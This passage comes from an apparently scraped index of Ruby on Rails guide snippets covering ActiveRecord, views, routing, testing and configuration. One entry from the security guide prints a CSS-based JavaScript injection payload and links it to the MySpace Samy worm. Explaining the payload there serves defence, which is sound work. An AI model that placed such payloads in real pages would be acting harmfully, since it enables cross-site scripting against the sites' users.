60.days.to_i %>\n    max_size: <%= 256.megabytes %>\n    namespace: <%= Rails.env %>\n```\n\n----------------------------------------\n\nTITLE: Scope Leakage Fix in ActiveRecord create Method\nDESCRIPTION: Demonstrates how relation.create no longer leaks scope to class-level querying methods in initialization blocks and callbacks.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/6_1_release_notes.md#2025-04-23_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\nUser.where(name: \"John\").create do |john|\n  User.find_by(name: \"David\") # => nil\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nUser.where(name: \"John\").create do |john|\n  User.find_by(name: \"David\") # => #<User name: \"David\", ...>\nend\n```\n\n----------------------------------------\n\nTITLE: Generated HTML Output for picture_tag Helper\nDESCRIPTION: Shows the resulting HTML generated by the `picture_tag(\"icon.webp\", \"icon.png\")` Rails helper call. It includes `<source>` elements for WebP and PNG formats, referencing assets via the asset pipeline, and a fallback `<img>` tag.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_33\n\nLANGUAGE: html\nCODE:\n```\n<picture>\n  <source srcset=\"/assets/icon.webp\" type=\"image/webp\" />\n  <source srcset=\"/assets/icon.png\" type=\"image/png\" />\n  <img src=\"/assets/icon.png\" />\n</picture>\n```\n\n----------------------------------------\n\nTITLE: Rails HTTP Header Setting Example Ruby\nDESCRIPTION: Demonstrates setting HTTP headers in a test request. This allows simulation of requests with custom header values. The example sets the Content-Type header to 'text/plain'.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_46\n\nLANGUAGE: ruby\nCODE:\n```\n# setting an HTTP Header\nget articles_url, headers: { \"Content-Type\": \"text/plain\" } # simulate the request with custom header\n```\n\n----------------------------------------\n\nTITLE: Generated SQL for Beginless Range in Rails\nDESCRIPTION: The SQL query generated for the beginless range uses the '>=' operator to select records where the `created_at` is greater than or equal to the specified date.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_67\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM books WHERE books.created_at >= '2008-12-21 00:00:00'\n```\n\n----------------------------------------\n\nTITLE: Cleaning Up Active Storage Fixtures in Parallel Tests\nDESCRIPTION: Implementation of a parallelize_teardown method to remove fixture files after all tests are complete when using parallel testing.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_81\n\nLANGUAGE: ruby\nCODE:\n```\nclass ActiveSupport::TestCase\n  # ...\n  parallelize_teardown do |i|\n    FileUtils.rm_rf(ActiveStorage::Blob.services.fetch(:test_fixtures).root)\n  end\n  # ...\nend\n```\n\n----------------------------------------\n\nTITLE: Default Scope Behavior Changes\nDESCRIPTION: Examples showing the changes in default scope behavior between Rails versions\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_83\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ActiveRecord::Base\n  default_scope { where state: \"pending\" }\n  scope :active, -> { where state: \"active\" }\n  scope :inactive, -> { where state: \"inactive\" }\nend\n\nUser.all\n# SELECT \"users\".* FROM \"users\" WHERE \"users\".\"state\" = 'pending'\n\nUser.active\n# SELECT \"users\".* FROM \"users\" WHERE \"users\".\"state\" = 'active'\n\nUser.where(state: \"inactive\")\n# SELECT \"users\".* FROM \"users\" WHERE \"users\".\"state\" = 'inactive'\n```\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ActiveRecord::Base\n  default_scope { where state: \"pending\" }\n  scope :active, -> { where state: \"active\" }\n  scope :inactive, -> { where state: \"inactive\" }\nend\n\nUser.all\n# SELECT \"users\".* FROM \"users\" WHERE \"users\".\"state\" = 'pending'\n\nUser.active\n# SELECT \"users\".* FROM \"users\" WHERE \"users\".\"state\" = 'pending' AND \"users\".\"state\" = 'active'\n\nUser.where(state: \"inactive\")\n```\n\n----------------------------------------\n\nTITLE: Generating Base Model for Delegated Types in Rails\nDESCRIPTION: Command to generate an Entry model that will serve as the superclass for delegated types, with fields to track the delegated record.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_83\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate model entry entryable_type:string entryable_id:integer\n```\n\n----------------------------------------\n\nTITLE: Counter Variable Usage in Partial\nDESCRIPTION: This snippet demonstrates using the `product_counter` variable within a partial to track the number of times the partial has been rendered within the enclosing view.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_93\n\nLANGUAGE: erb\nCODE:\n```\n<%= product_counter %> # 0 for the first product, 1 for the second product...\n```\n\n----------------------------------------\n\nTITLE: Configuring Active Storage Routes Prefix in Ruby\nDESCRIPTION: This snippet configures the route prefix for Active Storage routes. It sets the `config.active_storage.routes_prefix` to \"/files\". This allows customizing the URL path for accessing Active Storage files.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_78\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.active_storage.routes_prefix = \"/files\"\n```\n\n----------------------------------------\n\nTITLE: CSS-based JavaScript injection technique\nDESCRIPTION: An example of CSS injection that executes JavaScript through the style attribute. This technique was used in the famous MySpace Samy worm attack.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_48\n\nLANGUAGE: html\nCODE:\n```\n<div style=\"background:url('javascript:alert(1)')\">\n```\n\n----------------------------------------\n\nTITLE: Using to_param in Active Model (IRB)\nDESCRIPTION: Demonstrates the `to_param` method, which returns a string representation of the object's key suitable for URLs, or `nil` if `persisted?` is `false`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_model_basics.md#_snippet_17\n\nLANGUAGE: irb\nCODE:\n```\nirb> person.to_param\n=> \"1\"\n```\n\n----------------------------------------\n\nTITLE: Checking Current Page with current_page? in Ruby on Rails\nDESCRIPTION: Shows how to use the current_page? helper to check if the current request URL matches given options.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_14\n\nLANGUAGE: ruby\nCODE:\n```\n<% if current_page?(controller: 'profiles', action: 'show') %>\n  <strong>Currently on the profile page</strong>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Example of Command-line Documentation Format\nDESCRIPTION: Demonstrates how to format command-line instructions in documentation with the `$` prefix for commands. Shows that output doesn't need a specific prefix.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_documentation_guidelines.md#2025-04-23_snippet_17\n\nLANGUAGE: ruby\nCODE:\n```\n# Run the following command:\n#   $ bin/rails new zomg\n#   ...\n```\n\n----------------------------------------\n\nTITLE: Stylesheet Link Tag with Media (Rails/ERB)\nDESCRIPTION: This example demonstrates how to include a CSS file with a specific media type (print) using the `stylesheet_link_tag` helper.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_51\n\nLANGUAGE: erb\nCODE:\n```\n<%= stylesheet_link_tag \"main_print\", media: \"print\" %>\n```\n\n----------------------------------------\n\nTITLE: Singularize String\nDESCRIPTION: This snippet demonstrates singularizing a string using the `singularize` method. It handles irregular plurals and uncountable nouns.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_65\n\nLANGUAGE: ruby\nCODE:\n```\n\"tables\".singularize    # => \"table\"\n\"rubies\".singularize    # => \"ruby\"\n\"equipment\".singularize # => \"equipment\"\n```\n\n----------------------------------------\n\nTITLE: Rendering Turbo Stream in Ruby Controller\nDESCRIPTION: Example of rendering a Turbo Stream response in a Rails controller action, demonstrating both automatic view lookup and inline rendering.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/working_with_javascript_in_rails.md#2025-04-23_snippet_8\n\nLANGUAGE: ruby\nCODE:\n```\ndef create\n  @post = Post.new(post_params)\n\n  respond_to do |format|\n    if @post.save\n      format.turbo_stream\n    else\n      format.html { render :new, status: :unprocessable_entity }\n    end\n  end\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\ndef create\n  @post = Post.new(post_params)\n\n  respond_to do |format|\n    if @post.save\n      format.turbo_stream { render turbo_stream: turbo_stream.prepend(\"posts\", partial: \"post\") }\n    else\n      format.html { render :new, status: :unprocessable_entity }\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Manually Reporting Errors with Rails.error.report in Ruby\nDESCRIPTION: Demonstrates how to manually report errors using Rails.error.report within a begin-rescue block. This allows for custom error handling logic before reporting.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/error_reporting.md#2025-04-23_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\nbegin\n  # code\nrescue StandardError => e\n  Rails.error.report(e)\nend\n```\n\n----------------------------------------\n\nTITLE: SQL equivalent of first with composite primary key\nDESCRIPTION: SQL query for retrieving the first record with a composite primary key (`store_id`, `id`). The ordering is done based on these columns in ascending order.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_23\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM customers ORDER BY customers.store_id ASC, customers.id ASC LIMIT 1\n```\n\n----------------------------------------\n\nTITLE: Resourceful Route with Path Names Override within Scope in Rails\nDESCRIPTION: This code demonstrates how to set a consistent `new` path name across multiple routes by using a scope block.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_68\n\nLANGUAGE: ruby\nCODE:\n```\nscope path_names: { new: \"make\" } do\n  # rest of your routes\nend\n```\n\n----------------------------------------\n\nTITLE: Original SQL Query Without Only (SQL)\nDESCRIPTION: This SQL query represents the original query before the `only` method was applied. It includes a `where`, `order` and `limit` clause.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_108\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM books WHERE id > 10 ORDER BY id DESC LIMIT 20\n```\n\n----------------------------------------\n\nTITLE: Configuring Engine Test Routes in Ruby\nDESCRIPTION: Shows how to properly configure routes for engine testing by setting up the @routes instance variable in the test setup.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_54\n\nLANGUAGE: ruby\nCODE:\n```\nmodule Blorgh\n  class FooControllerTest < ActionDispatch::IntegrationTest\n    include Engine.routes.url_helpers\n\n    setup do\n      @routes = Engine.routes\n    end\n\n    def test_index\n      get foos_url\n      # ...\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Date Select Helper in ERB\nDESCRIPTION: This ERB code demonstrates the use of `date_select` helper to render separate select boxes for year, month, and day.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_42\n\nLANGUAGE: erb\nCODE:\n```\n<%= form_with model: @person do |form| %>\n  <%= form.date_select :birth_date %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Use Hash as Cache Key\nDESCRIPTION: This code demonstrates using a hash as a cache key with `Rails.cache.read`. The keys within the hash (site, owners) will be part of the cache key.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_46\n\nLANGUAGE: ruby\nCODE:\n```\n# This is a valid cache key\nRails.cache.read(site: \"mysite\", owners: [owner_1, owner_2])\n```\n\n----------------------------------------\n\nTITLE: Setting Classic Autoloader in Rails 6\nDESCRIPTION: Configuration to use the classic autoloader in Rails 6 applications while still loading Rails 6 defaults. This is useful for applications that need to maintain backward compatibility.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_41\n\nLANGUAGE: ruby\nCODE:\n```\n# config/application.rb\n\nconfig.load_defaults 6.0\nconfig.autoloader = :classic\n```\n\n----------------------------------------\n\nTITLE: Generating a new API-only Rails application\nDESCRIPTION: Command to create a new Rails application configured for API-only use. This generates a slimmed down app without browser-specific middleware and components.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/5_0_release_notes.md#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ rails new my_api --api\n```\n\n----------------------------------------\n\nTITLE: Getting IDs from a Has and Belongs to Many Collection in Rails\nDESCRIPTION: Example of retrieving an array of IDs for all assemblies associated with a part using the assembly_ids method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_52\n\nLANGUAGE: ruby\nCODE:\n```\n@assembly_ids = @part.assembly_ids\n```\n\n----------------------------------------\n\nTITLE: Reporting Time Ago with time_ago_in_words in Ruby\nDESCRIPTION: Demonstrates the use of time_ago_in_words helper to report the approximate distance in time between a given time and the current time.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_1\n\nLANGUAGE: ruby\nCODE:\n```\ntime_ago_in_words(3.minutes.from_now) # => 3 minutes\n```\n\n----------------------------------------\n\nTITLE: Adding Index and Foreign Key Constraint in Rails Migration\nDESCRIPTION: Demonstrates how to add an index and foreign key constraint to the books table for improved performance and referential integrity.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_37\n\nLANGUAGE: ruby\nCODE:\n```\ncreate_table :books do |t|\n  t.belongs_to :author, index: true, foreign_key: true\n  # ...\nend\n```\n\n----------------------------------------\n\nTITLE: Rendering Different Partial for Attachment\nDESCRIPTION: This snippet shows how to define `User#to_attachable_partial_path` to render a different partial for the attachable. This allows customizing the rendering of the attachment element.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_text_overview.md#_snippet_14\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ApplicationRecord\n  def to_attachable_partial_path\n    \"users/attachable\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Broadcast to Chat Channel Ruby\nDESCRIPTION: This Ruby code broadcasts a message to a specified chat channel using ActionCable.server.broadcast. The message contains a body with the text \"This Room is Best Room.\"\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_cable_overview.md#_snippet_13\n\nLANGUAGE: Ruby\nCODE:\n```\nActionCable.server.broadcast(\"chat_Best Room\", { body: \"This Room is Best Room.\" })\n```\n\n----------------------------------------\n\nTITLE: Using to_param in Rails\nDESCRIPTION: Demonstrates using the overridden `to_param` method in the Rails console to generate a URL with the identifier. This verifies that the `to_param` method is working as expected.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_81\n\nLANGUAGE: irb\nCODE:\n```\nirb> video = Video.find_by(identifier: \"Roman-Holiday\")\nirb> edit_video_path(video)\n=> \"/videos/Roman-Holiday/edit\"\n```\n\n----------------------------------------\n\nTITLE: Adding Objects to a Has and Belongs to Many Collection in Rails\nDESCRIPTION: Example of using the << method to add an assembly to a part's collection of assemblies, which creates records in the join table.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_49\n\nLANGUAGE: ruby\nCODE:\n```\n@part.assemblies << @assembly1\n```\n\n----------------------------------------\n\nTITLE: Examples of Correct Software Name Spelling in Documentation\nDESCRIPTION: Lists properly spelled names of software and technologies commonly referenced in Rails documentation, showing correct capitalization and formatting.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_documentation_guidelines.md#2025-04-23_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\n# GOOD\n# Arel\n# ERB\n# Hotwire\n# HTML\n# JavaScript\n# minitest\n# MySQL\n# npm\n# PostgreSQL\n# RSpec\n```\n\n----------------------------------------\n\nTITLE: Listing Model Column Names in Console\nDESCRIPTION: This command retrieves and displays the column names of the `Product` model's corresponding database table. It is executed within the Rails console environment.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_12\n\nLANGUAGE: irb\nCODE:\n```\nstore(dev)> Product.column_names\n```\n\n----------------------------------------\n\nTITLE: Multiple Conditions for Active Record Callbacks\nDESCRIPTION: Demonstrates how to combine :if and :unless options on the same callback with multiple conditions in an array.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/2_3_release_notes.md#2025-04-23_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\nbefore_save :update_credit_rating, :if => :active,\n  :unless => [:admin, :cash_only]\n```\n\n----------------------------------------\n\nTITLE: Setting Up Git Remotes for Rails Fork\nDESCRIPTION: This bash snippet demonstrates how to set up Git remotes for a Rails fork, including adding the fork remote and the official Rails remote.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_42\n\nLANGUAGE: bash\nCODE:\n```\n$ git remote add fork https://github.com/<your username>/rails.git\n$ git remote add rails https://github.com/rails/rails.git\n```\n\n----------------------------------------\n\nTITLE: Attribute Type Declaration for Interval Columns\nDESCRIPTION: Demonstrates how to maintain the legacy string behavior for interval columns in PostgreSQL databases instead of the new ActiveSupport::Duration return type.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/7_0_release_notes.md#2025-04-23_snippet_1\n\nLANGUAGE: ruby\nCODE:\n```\nattribute :column, :string\n```\n\n----------------------------------------\n\nTITLE: Creating a Controller\nDESCRIPTION: Demonstrates the basic structure of a Rails controller, inheriting from `ApplicationController` and defining an action method. It shows how Rails automatically renders a view if the action is empty.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\nclass ClientsController < ApplicationController\n  def new\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Session Store - Ruby\nDESCRIPTION: This snippet demonstrates how to configure the session store in a Rails application using an initializer. It sets the session store to `:cache_store`. This configuration is typically placed in `config/initializers/session_store.rb`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_33\n\nLANGUAGE: ruby\nCODE:\n```\nRails.application.config.session_store :cache_store\n```\n\n----------------------------------------\n\nTITLE: Example of a Rails Application Template Script in Ruby\nDESCRIPTION: Provides a starting example of a Rails application template, which is a Ruby script used to automate application setup and customization. These templates can leverage Rails generator helper methods.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/generators.md#2025-04-23_snippet_24\n\nLANGUAGE: ruby\nCODE:\n```\n\n```\n\n----------------------------------------\n\nTITLE: Customizing the Editor Container\nDESCRIPTION: ERB snippet customizing the HTML container element rendered around rich text content, allowing modification of the styling using the `trix-content` class.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_text_overview.md#_snippet_7\n\nLANGUAGE: html\nCODE:\n```\n<%# app/views/layouts/action_text/contents/_content.html.erb %>\n<div class=\"trix-content\">\n  <%= yield %>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Process Customers in Batches using `find_in_batches` in Ruby\nDESCRIPTION: This snippet demonstrates using `find_in_batches` to process customers in batches of 1000.  The block receives an array of `Customer` objects.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_48\n\nLANGUAGE: ruby\nCODE:\n```\n# Give add_customers an array of 1000 customers at a time.\nCustomer.find_in_batches do |customers|\n  export.add_customers(customers)\nend\n```\n\n----------------------------------------\n\nTITLE: Running RuboCop to check code style\nDESCRIPTION: Command to run RuboCop against a specific file to verify it meets Ruby on Rails coding conventions before submitting a pull request.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_11\n\nLANGUAGE: bash\nCODE:\n```\n$ bundle exec rubocop actionpack/lib/action_controller/metal/strong_parameters.rb\nInspecting 1 file\n.\n\n1 file inspected, no offenses detected\n```\n\n----------------------------------------\n\nTITLE: Updating Session Store in Rails 3.1\nDESCRIPTION: This snippet shows how to update the session store configuration in Rails 3.1, either by changing the session key or clearing all sessions.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_109\n\nLANGUAGE: ruby\nCODE:\n```\n# in config/initializers/session_store.rb\nAppName::Application.config.session_store :cookie_store, key: \"SOMETHINGNEW\"\n```\n\n----------------------------------------\n\nTITLE: Creating Database Test Environments\nDESCRIPTION: Commands to create and manage test databases for Active Record, including options to create databases for specific engines or drop all databases.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/development_dependencies_install.md#2025-04-23_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\n$ cd activerecord\n$ bundle exec rake db:create\n```\n\nLANGUAGE: bash\nCODE:\n```\n$ cd activerecord\n$ bundle exec rake db:mysql:build\n$ bundle exec rake db:postgresql:build\n```\n\nLANGUAGE: bash\nCODE:\n```\n$ cd activerecord\n$ bundle exec rake db:drop\n```\n\n----------------------------------------\n\nTITLE: Installing Rails 3.0 via RubyGems\nDESCRIPTION: Command to install Rails 3.0 using the gem package manager. May require sudo privileges depending on system configuration.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_0_release_notes.md#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n# Use sudo if your setup requires it\n$ gem install rails\n```\n\n----------------------------------------\n\nTITLE: Has One Through Association Setup\nDESCRIPTION: Example of setting up one-to-one relationships through an intermediate model using has_one :through.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_45\n\nLANGUAGE: ruby\nCODE:\n```\nclass Supplier < ApplicationRecord\n  has_one :account\n  has_one :account_history, through: :account\nend\n\nclass Account < ApplicationRecord\n  belongs_to :supplier\n  has_one :account_history\nend\n\nclass AccountHistory < ApplicationRecord\n  belongs_to :account\nend\n```\n\n----------------------------------------\n\nTITLE: Overriding source_paths\nDESCRIPTION: Demonstrates how to override the `source_paths` method to include the template's location, allowing relative paths to be used with methods like `copy_file`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/rails_application_templates.md#_snippet_19\n\nLANGUAGE: ruby\nCODE:\n```\ndef source_paths\n  [__dir__]\nend\n```\n\n----------------------------------------\n\nTITLE: Setting up Kamal\nDESCRIPTION: This command initializes the server for deployment using Kamal. It configures the necessary services and dependencies for the application to run in production.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_133\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/kamal setup\n```\n\n----------------------------------------\n\nTITLE: Configuring Parallelization Threshold\nDESCRIPTION: This code demonstrates how to configure the parallelization threshold in `test.rb` and at the test case level, setting a minimum number of tests before parallelization occurs.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_116\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.active_support.test_parallelization_threshold = 100\n```\n\nLANGUAGE: ruby\nCODE:\n```\nclass ActiveSupport::TestCase\n  parallelize threshold: 100\nend\n```\n\n----------------------------------------\n\nTITLE: Rails Params Hash Example (Nested)\nDESCRIPTION: Demonstrates how nested form input translates into the params hash in a Rails controller, with an address hash nested within the person hash.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_70\n\nLANGUAGE: ruby\nCODE:\n```\n{ \"person\" => { \"address\" => { \"city\" => \"New York\" } } }\n```\n\n----------------------------------------\n\nTITLE: Using the Outline Command in Rails Debugger\nDESCRIPTION: The `outline` command shows what is accessible from the current scope, including local variables, instance variables, class variables, and methods with their sources. Similar to the `ls` command in pry and irb.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/debugging_rails_applications.md#2025-04-23_snippet_20\n\nLANGUAGE: ruby\nCODE:\n```\nActiveSupport::Configurable#methods: config\nAbstractController::Base#methods:\n  action_methods  action_name  action_name=  available_action?  controller_path  inspect\n  response_body\nActionController::Metal#methods:\n  content_type       content_type=  controller_name  dispatch          headers\n  location           location=      media_type       middleware_stack  middleware_stack=\n  middleware_stack?  performed?     request          request=          reset_session\n  response           response=      response_body=   response_code     session\n  set_request!       set_response!  status           status=           to_a\nActionView::ViewPaths#methods:\n  _prefixes  any_templates?  append_view_path   details_for_lookup  formats     formats=  locale\n  locale=    lookup_context  prepend_view_path  template_exists?    view_paths\nAbstractController::Rendering#methods: view_assigns\n\n# .....\n\nPostsController#methods: create  destroy  edit  index  new  show  update\ninstance variables:\n  @_action_has_layout  @_action_name    @_config  @_lookup_context                      @_request\n  @_response           @_response_body  @_routes  @marked_for_same_origin_verification  @posts\n  @rendered_format\nclass variables: @@raise_on_open_redirects\n```\n\n----------------------------------------\n\nTITLE: Active Job Transaction Handling\nDESCRIPTION: Example showing how jobs are handled within transactions and configuration options for transaction-based job scheduling.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/7_2_release_notes.md#2025-04-23_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\nTopic.transaction do\n  topic = Topic.create\n\n  NewTopicNotificationJob.perform_later(topic)\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nclass NewTopicNotificationJob < ApplicationJob\n  self.enqueue_after_transaction_commit = :never\nend\n```\n\n----------------------------------------\n\nTITLE: Modifying prepend Calls with ActiveSupport.on_load in Ruby\nDESCRIPTION: This Ruby code snippet shows how to modify calls to `prepend` using `ActiveSupport.on_load`, ensuring that `MyActionControllerHelper` is prepended only when `ActionController::Base` is loaded.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_106\n\nLANGUAGE: ruby\nCODE:\n```\nActiveSupport.on_load(:action_controller_base) do\n  # self refers to ActionController::Base here,\n  # so we can call .prepend\n  prepend MyActionControllerHelper\nend\n```\n\n----------------------------------------\n\nTITLE: Basic Integration Test - Ruby\nDESCRIPTION: This Ruby code defines a basic integration test inheriting from ActionDispatch::IntegrationTest. It includes a placeholder test that asserts true, providing a starting point for building more complex integration tests.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_55\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"test_helper\"\n\nclass UserFlowsTest < ActionDispatch::IntegrationTest\n  # test \"the truth\" do\n  #   assert true\n  # end\nend\n```\n\n----------------------------------------\n\nTITLE: Query Books by Title Using Array Conditions in Ruby\nDESCRIPTION: This snippet demonstrates using array conditions with the `where` method to prevent SQL injection.  The title is passed as a parameter to the query.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_54\n\nLANGUAGE: ruby\nCODE:\n```\nBook.where(\"title = ?\", params[:title])\n```\n\n----------------------------------------\n\nTITLE: Setting Test Order to Sorted in Rails 5\nDESCRIPTION: Configures ActiveSupport::TestCase to use sorted test order instead of the new random default in Rails 5. This configuration should be placed in the test environment file.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_51\n\nLANGUAGE: ruby\nCODE:\n```\n# config/environments/test.rb\nRails.application.configure do\n  config.active_support.test_order = :sorted\nend\n```\n\n----------------------------------------\n\nTITLE: Creating Records with Single Table Inheritance in Rails\nDESCRIPTION: Demonstrates how to create a Car record which will be stored in the vehicles table with the type field set to 'Car'.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_74\n\nLANGUAGE: ruby\nCODE:\n```\nCar.create(color: \"Red\", price: 10000)\n```\n\n----------------------------------------\n\nTITLE: Skipping Rails Components\nDESCRIPTION: Demonstrates how to skip certain Rails components during application creation using the --skip flag.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/command_line.md#2025-04-23_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\n$ rails new sas --skip-active-storage\nBased on the specified options, the following options will also be activated:\n\n  --skip-action-mailbox [due to --skip-active-storage]\n  --skip-action-text [due to --skip-active-storage]\n\n      create\n      create  README.md\n      ...\n```\n\n----------------------------------------\n\nTITLE: SQL Query after Reversing Order (SQL)\nDESCRIPTION: This SQL query demonstrates the effect of the `reverse_order` method.  The results are now ordered by `year_published` in descending order.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_118\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM books WHERE author_id > 10 ORDER BY year_published DESC\n```\n\n----------------------------------------\n\nTITLE: Generating Multi-Database Configuration in Rails\nDESCRIPTION: Command to generate an initializer file for automatic shard swapping in a Rails application using the active_record:multi_db generator.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_multiple_databases.md#2025-04-23_snippet_24\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails g active_record:multi_db\n```\n\n----------------------------------------\n\nTITLE: Configuring Active Record Schema Format (Ruby)\nDESCRIPTION: This code snippet shows how to configure the schema format for Active Record using the `config.active_record.schema_format` setting in `config/application.rb`. It sets the schema format to `:ruby`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_1\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.active_record.schema_format = :ruby\n```\n\n----------------------------------------\n\nTITLE: Configuring Mandrill Ingress in Rails\nDESCRIPTION: This Ruby code configures Action Mailbox to accept emails from Mandrill.  It needs to be placed in the application's production environment configuration.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailbox_basics.md#_snippet_4\n\nLANGUAGE: Ruby\nCODE:\n```\n# config/environments/production.rb\nconfig.action_mailbox.ingress = :mandrill\n```\n\n----------------------------------------\n\nTITLE: Truncate Words with Custom Omission\nDESCRIPTION: This snippet truncates a string after a specified number of words, using a custom omission string.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_49\n\nLANGUAGE: ruby\nCODE:\n```\n\"Oh dear! Oh dear! I shall be late!\".truncate_words(4, omission: \"&hellip;\")\n# => \"Oh dear! Oh dear!&hellip;\"\n```\n\n----------------------------------------\n\nTITLE: Model Table Name Pluralization Configuration\nDESCRIPTION: Shows how to configure table name pluralization at the individual model level using the pluralize_table_names class method\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_1_release_notes.md#2025-04-23_snippet_13\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ActiveRecord::Base\n  self.pluralize_table_names = 